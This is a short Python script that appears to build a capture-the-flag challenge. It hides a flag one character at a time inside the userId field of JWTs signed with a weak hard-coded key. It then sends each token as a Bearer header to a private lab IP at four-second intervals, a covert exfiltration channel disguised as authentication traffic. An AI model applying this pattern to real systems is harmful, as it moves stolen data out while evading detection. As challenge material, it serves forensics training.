import jwt
import time
import requests
flag = '4Z1Z{Avada_Kadavra_Y0uve_b33n_3xf1l7rat3d}'
decimal_flag = [ord(char) for char in flag]
secret_key = "hehehehehehehehehehehehehehehehehehehehe"
ip_address = "http://192.168.246.128:8000"  
tokens = []
for value in decimal_flag:
    payload = {"userName":"Tommy",
              "password":"Nagini",
              "userId": value,
              "role": "Darklord"
              }
    token = jwt.encode(payload, secret_key, algorithm="HS256")
    
    if isinstance(token, bytes):
        token = token.decode('utf-8')
    
    tokens.append(token)

for i, token in enumerate(tokens, start=1):
    headers = {"Authorization": f"Bearer {token}"}
    try:
        response = requests.get(ip_address, headers=headers)
        print(f"Request {i}: Status Code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request {i} failed: {e}")
    
    time.sleep(4)
